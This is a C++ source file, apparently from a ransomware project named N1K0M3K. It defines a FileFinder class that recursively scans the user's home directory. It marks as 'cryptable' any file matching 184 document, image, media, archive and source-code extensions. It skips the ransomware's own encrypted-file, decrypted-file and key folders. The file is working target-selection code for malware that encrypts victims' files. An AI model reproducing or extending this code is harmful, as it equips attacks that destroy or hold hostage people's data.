#include "config.h"
#include "FileFinder.h"
#ifdef LINUX
#include <dirent.h>
#include <errno.h>
#include <sys/types.h>
#else
#include <dirent.h>
#include <Windows.h>
#endif
#include <vector>
#include <iostream>

using namespace std;

FileFinder::FileFinder(string path) {
#ifdef LINUX		
	getFilesOnDir(path, files);
#else
	string homePathString(getenv("HOMEPATH"));
	homePathString = homePathString + "\\";
	getFilesOnDir(homePathString, files);


#endif		

}
vector<string> FileFinder::getFiles() {
	return files;
}

unsigned cryptable(string filename) {
	string extentions[184] = { ".bmp",".gif",".ico",".jpeg",".jpg",".psd",".tiff",".tif",".png",".cad",".txt",".doc",".dot",".dat",".wbk",".docx",".docm",".dotx",".dotm",".docb",".xls",".xlt",".xlm",".xlsx",".xlsm",".xltx",".xltm",".ppt",".pot",".pps",".pptx",".pptm",".potx",".potm",".ppam",".ppsx",".ppsm",".sldx",".sldm",".pub",".xps",".pdf",".sql",".backup",".avi",".mov",".mpg",".mpa",".asf",".wma",".mp2",".m2p",".mp3",".dif",".vob",".htm",".html",".xml",".php",".asp",".rar",".zip",".7z",".tar",".py",".cpp",".java",".c",".h",".hpp",".tex",".ltx",".sxw",".odt",".stw",".ott",".sxc",".ods",".stc",".ots",".sxi",".odp",".sti",".otp",".odb",".sxd",".odg",".std",".otg",".sxm",".odf",".dwg"
		,".BMP",".GIF",".ICO",".JPEG",".JPG",".PSD",".TIFF",".TIF",".PNG",".CAD",".TXT",".DOC",".DOT",".DAT",".WBK",".DOCX",".DOCM",".DOTX",".DOTM",".DOCB",".XLS",".XLT",".XLM",".XLSX",".XLSM",".XLTX",".XLTM",".PPT",".POT",".PPS",".PPTX",".PPTM",".POTX",".POTM",".PPAM",".PPSX",".PPSM",".SLDX",".SLDM",".PUB",".XPS",".PDF",".SQL",".BACKUP",".AVI",".MOV",".MPG",".MPA",".ASF",".WMA",".MP2",".M2P",".MP3",".DIF",".VOB",".HTM",".HTML",".XML",".PHP",".ASP",".RAR",".ZIP",".7Z",".TAR",".PY",".CPP",".JAVA",".C",".H",".HPP",".TEX",".LTX",".SXW",".ODT",".STW",".OTT",".SXC",".ODS",".STC",".OTS",".SXI",".ODP",".STI",".OTP",".ODB",".SXD",".ODG",".STD",".OTG",".SXM",".ODF",".DWG" };

	int extentionsLenght = 184;

	if (filename.find("N1K0M3K") != std::string::npos) {
		return 0;
	}

	for (int i = 0; i<extentionsLenght; i++) {
		if (filename.find(extentions[i].c_str()) != std::string::npos) {
			return 1;
		}
	}
	return 0;

}


void FileFinder::getFilesOnDir(string directory, vector<string> &v) {
	DIR *dir;
	string path;

	struct dirent *entry;
	if ((dir = opendir(directory.c_str())) == NULL) {
#ifdef LINUX
		if (errno == 20)
#else	      	
		if (errno == errno)
#endif	      	 	
		{
			if (cryptable(directory) == 1)
				v.push_back(directory);
		}
	}
	else {
		while ((entry = readdir(dir)) != NULL) {
			if (strcmp(entry->d_name, "..") != 0 && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "bin") != 0 && entry->d_name[0] != '.' && strcmp(entry->d_name, "N1K0M3K") != 0 && strcmp(entry->d_name, "N1KOM3K_ENCRYPTED_FILES") != 0 && strcmp(entry->d_name, "N1KOM3K_DECRYPTED_FILES") != 0 && strcmp(entry->d_name, "N1KOM3K_KEYS") != 0 && strcmp(entry->d_name, "Library") != 0 && strcmp(entry->d_name, "AppData") != 0) {
#ifdef LINUX
				path = directory + "/" + entry->d_name;
#else
				path = directory + "\\" + entry->d_name;
#endif
				getFilesOnDir(path, v);
			}
		}
		closedir(dir);
	}
}

// 
// int main(){
// FileFinder f("/Users/s-man");
// cout<<f.getFiles().at(0);
// }